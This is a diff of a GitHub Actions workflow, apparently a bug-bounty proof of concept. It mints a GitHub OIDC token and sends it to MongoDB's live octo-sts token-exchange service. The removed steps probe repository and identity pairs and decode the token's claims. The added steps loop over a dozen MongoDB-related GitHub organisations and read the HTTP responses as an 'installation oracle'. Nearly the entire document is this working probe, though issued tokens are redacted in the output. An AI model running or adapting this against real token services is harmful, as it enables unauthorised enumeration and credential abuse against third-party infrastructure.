@@ -8,17 +8,14 @@ jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: Mint OIDC token and probe octo-sts
+      - name: Enumerate octo-sts installations
         run: |
           set -u
           TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=octo-sts.mongodb.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
-          echo "token minted: ${#TOK} chars"
-          echo "sub claim: $(echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("sub"),"| iss:",d.get("iss"),"| aud:",d.get("aud"))' 2>/dev/null)"
-          echo "--- exchange probes (status + message only) ---"
-          for combo in "mongodb/mongo|octo-sts" "mongodb/docs|octo-sts" "mongodb/mongo|ci" "mongodb/mongo|release" "kaiksi-bb/cb-comment-control-poc|octo-sts"; do
-            SCOPE="${combo%%|*}"; ID="${combo##*|}"
-            R=$(curl -sS -o /tmp/o -w '%{http_code}' -H "Authorization: Bearer $TOK" \
-              "https://octo-sts.mongodb.com/sts/exchange?scope=$SCOPE&identity=$ID")
-            echo "  scope=$SCOPE identity=$ID -> HTTP $R :: $(head -c 180 /tmp/o | tr -d '\n' | sed 's/"token":"[^"]*"/"token":"<REDACTED>"/')"
+          echo "--- installation oracle across MongoDB-related orgs ---"
+          for ORG in mongodb 10gen mongodb-js mongodb-labs mongodb-developer mongodb-partners mongodb-university mongodb-forks mongodb-industry-solutions mongodb-eng mongodb-enterprise mongodbinc; do
+            C=$(curl -sS -o /tmp/o -w '%{http_code}' -H "Authorization: Bearer $TOK" \
+              "https://octo-sts.mongodb.com/sts/exchange?scope=$ORG/x&identity=octo-sts")
+            echo "  $ORG -> HTTP $C :: $(head -c 150 /tmp/o | tr -d '\n' | sed 's/"token":"[^"]*"/"token":"<REDACTED>"/')"
           done
